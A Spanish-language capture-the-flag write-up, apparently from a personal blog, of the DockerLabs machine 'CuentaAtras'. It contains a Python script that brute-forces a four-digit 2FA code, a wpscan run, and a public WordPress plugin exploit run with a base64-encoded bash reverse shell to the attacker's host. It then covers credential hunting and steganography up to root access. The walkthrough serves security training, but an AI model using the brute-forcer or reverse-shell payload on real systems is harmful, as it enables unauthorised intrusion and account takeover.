---
title: "CuentaAtras"
description: "Guia completa de la enumeracion y la explotacion de la maquina CuentaAtras de DockerLabs"
date: 2026-14-03
creator: "mikisbd"
rating: 4.7
dificultad: "Medio"
author: "Ghxstsec"
draft: false
type: "post"
--- 

![CaptionLess image](/images/writeups/cuentatras/1.png)

Pues como siempre, comenzaremos enumerando el sistema con NMAP.

`sudo nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2`

    # Nmap 7.95 scan initiated Sat Mar 14 14:01:42 2026 as: nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2
    Nmap scan report for 172.17.0.2
    Host is up (0.0000070s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 44:8b:5d:b8:b1:d8:de:fd:c9:a5:fe:55:d2:2b:db:de (ECDSA)
    |_  256 1a:52:81:f8:4e:ee:37:2c:95:16:57:7c:2b:02:a4:e9 (ED25519)
    80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
    |_http-server-header: Apache/2.4.58 (Ubuntu)
    |_http-title: Login
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    MAC Address: 02:42:AC:11:00:02 (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Sat Mar 14 14:01:50 2026 -- 1 IP address (1 host up) scanned in 8.04 seconds

Podriamos ver que hay un servicio SSH y un servicio web en la maquina victima, asi que vamos a comenzar atacando el puerto web. Vamos a ver la web.

![CaptionLess image](/images/writeups/cuentatras/2.png)

Podemos ver un inicio de sesion, junto a un formulario de registro:

![CaptionLess image](/images/writeups/cuentatras/3.png)

Vamos a crear una cuenta, rellenamos el formulario:

![CaptionLess image](/images/writeups/cuentatras/4.png)

Y lo enviamos:

![CaptionLess image](/images/writeups/cuentatras/5.png)


Podemos ver que hay un doble factor de autenticacion mediante un codigo de 4 digitos, asi que capturaremos la peticion del registro, y con ella haremos un script en python para enviar todas las combinaciones posibles de 4 digitos:

![CaptionLess image](/images/writeups/cuentatras/6.png)

Yo lo hice con [Gemini](https://gemini.google.com/)

    import requests

    # Configuración del objetivo
    url = "http://172.17.0.2/verify.php"

    # Headers basados en tu request original
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://172.17.0.2",
        "Referer": "http://172.17.0.2/verify.php",
        "Connection": "keep-alive",
    }

    # Cookies necesarias (asegúrate de que el PHPSESSID sea válido)
    cookies = {
        "wordpress_a2a379b8590d3431d7153bb3b68da0df": "admin%7C1772971882%7CGDi1CIYrSkzgk1zuS6Cn7kV7EOSnTNA5o7MNE2JZWvE%7C8f1332ff53d753fb9d3b3e2c95019bf53faf91b75d23762734bad9a4efc9c90f",
        "wp-settings-time-1": "1772799204",
        "PHPSESSID": "h8dnme774g2d2giv2c0knfle2n"
    }

    def brute_force():
        # Iterar del 0000 al 9999
        for i in range(10000):
            # Formatear el número a 4 dígitos con ceros a la izquierda
            code = f"{i:04d}"
            data = {"code": code}
            
            try:
                response = requests.post(url, headers=headers, cookies=cookies, data=data)
                
                # Condición de éxito: aquí debes ajustar según qué responda la web 
                # cuando el código es CORRECTO (ej: un código HTTP 302, o un texto específico)
                if "Código incorrecto" not in response.text:
                    print(f"[+] ¡Código encontrado!: {code}")
                    break
                
                if i % 100 == 0:
                    print(f"[*] Probando... último intento: {code}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] Error de conexión: {e}")
                break

    if __name__ == "__main__":
        brute_force()

asi que lo ejecutaremos y intentara todas las combinaciones de 4 digitos

![CaptionLess image](/images/writeups/cuentatras/7.png)

![CaptionLess image](/images/writeups/cuentatras/8.png)

Le damos a verificar y...

![CaptionLess image](/images/writeups/cuentatras/9.png)

Nos saldra este panel, pero eso significa que se ha creado bien el usuario:

![CaptionLess image](/images/writeups/cuentatras/10.png)

Vamos al portal:

![CaptionLess image](/images/writeups/cuentatras/11.png)

Es un wordpress, para esto usaremos wpscan para enumerar la web.

`wpscan --api-token [REDACTED] --url http://172.17.0.2/secret_portal_65hBlEo9OU/ -e u,p --plugins-detection aggressive`

![CaptionLess image](/images/writeups/cuentatras/12.png)

Podemos ver un plugin vulnerable: 'wpvivid-backuprestore', asi que buscamos un POC para este exploit.

yo usare este:

![Captionless Image](/images/writeups/cuentatras/github.png)
[Repo](https://github.com/halilkirazkaya/CVE-2026-1357)

Le hacemos un git clone y ejecutaremos el exploit:

    git clone https://github.com/halilkirazkaya/CVE-2026-1357
    cd CVE-2026-1357
    python3 -m venv ./venv
    source /venv/bin/activate.fish
    pip3 install -r requirements.txt
    nc -nlvp 9001
    python3 exploit.py -u http://172.17.0.2/secret_portal_65hBlEo9OU/ -s 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvOTAwMSAwPiYx|base64 -d|bash'

El exploit que estamos ejecutando en el parametro "-s" es una reverse shell encodeada en base64, tambien os deberia funcionar a vosotros ya que apunta a la IP raiz de docker (172.17.0.1) que es la que posiblemente estemos usando, si no funciona podeis crearos vuestro payload en [Revshells](https://www.revshells.com/)

asi que recibiremos esa reverse shell:

![CaptionLess image](/images/writeups/cuentatras/16.png)

Analizando un poco los archivos de la maquina victima, podemos encontrar un archivo interesante el /var/www/html:

![CaptionLess image](/images/writeups/cuentatras/17.png)


lo abriremos:

![CaptionLess image](/images/writeups/cuentatras/18.png)


Podremos ver una session_id junto a una cadena en base64, si la decodificamos podremos ver lo siguiente:

![CaptionLess image](/images/writeups/cuentatras/19.png)


asi que iniciaremos sesion por ssh con el usuario ethan:

![CaptionLess image](/images/writeups/cuentatras/20.png)

Podremos ver que despues de un tiempo, nos cierra sesion automaticamente, asi que miraremos en el .bashrc por algun proceso que se este ejecutando para esta accion.

Recordad que hay que ir bastante rapido:

![CaptionLess image](/images/writeups/cuentatras/21.png)

Podremos ver que la funcion bash se llama "TMOUT" asi que usaremos "unset" para quitar esa funcion:

`unset TMOUT`
![CaptionLess image](/images/writeups/cuentatras/22.png)

Asi que ya tendriamos una shell estable en el usuario "ethan", vamos a enumerar la carpeta miscosas:

podemos ver alguna carpeta un tanto rara, pero en la carpeta /fotos podremos encontrar algo interesante:

![CaptionLess image](/images/writeups/cuentatras/23.png)

asi que iniciaremos un server en python y descargarnos esa imagen:

`python3 -m http.server 9000`

![CaptionLess image](/images/writeups/cuentatras/24.png)


![CaptionLess image](/images/writeups/cuentatras/25.png)


no la podremos abrir, asi que vamos a ver con xxd para ver que pasa:

![CaptionLess image](/images/writeups/cuentatras/26.png)


Tiene los magic bytes de png siendo una imagen jpg, asi que con la herramienta [magicbytes.py](https://github.com/Haxrein/MagicBytes/tree/main)
le cambiaremos esos bytes por los de jpg.

![CaptionLess image](/images/writeups/cuentatras/27.png)

Asi que ya la podremos abrir:

![CaptionLess image](/images/writeups/cuentatras/28.png)


No hay nada interesante al parecer, asi que lo pasamos por [stegseek](https://github.com/RickdeJager/stegseek) para ver la steganografia:

![CaptionLess image](/images/writeups/cuentatras/29.png)

En mi caso asumo que es la password del usuario root, asi que asi pruebo:

![CaptionLess image](/images/writeups/cuentatras/31.png)

Asi que hasta ahi llegaria esta maquina.

Muchas gracias por quedarte hasta el final :)

En esta misma web podras ver mas write-ups mios, mis certificaciones, etc... Si quieres conocerme un poco mejor tienes todas mis RR.SS en soyjoel.com

Un saludo!
